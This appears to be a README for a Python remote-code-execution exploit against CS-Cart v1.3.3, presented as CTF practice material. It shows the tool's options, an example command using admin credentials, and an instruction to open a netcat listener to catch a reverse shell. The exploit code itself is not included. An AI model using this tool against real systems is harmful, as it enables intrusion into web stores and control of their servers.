## Cs-Cart v1.3.3 RCE
- [CS-Cart Multi-Vendor](https://www.cs-cart.com/) is a standalone eCommerce marketplace platform that allows you to create a marketplace.
- This exploit has been designed to practice on CTF vulnerable machines running an outdated version of CS-Cart
## USAGE:
```
❯ python3 Cs-Cart.py -h
usage: Cs-Cart.py [-h] -U URL -u USERNAME -p PASSWORD -L IP -P PORT

CS-Cart RCE Exploit v1.3.3

options:
  -h, --help            show this help message and exit
  -U URL, --url URL     Remote host URL where CS-Cart is located
  -u USERNAME, --username USERNAME
                        CS-Cart Admin username
  -p PASSWORD, --password PASSWORD
                        CS-Cart Admin password
  -L IP, --ip IP        Local IP address for reverseshell
  -P PORT, --port PORT  Local port to received reverseshell
```
## EXAMPLE:
```
❯ python3 Cs-Cart.py -U http://192.168.199.39 -u admin -p admin -L 192.168.45.161 -P 443
```
![cs-cart1](https://github.com/user-attachments/assets/48651990-ed48-4bc6-b407-9922bedd2db4)

**[!] Do not forget to open a netcat listener on the port specified in the exploit to recieved the revershell.**
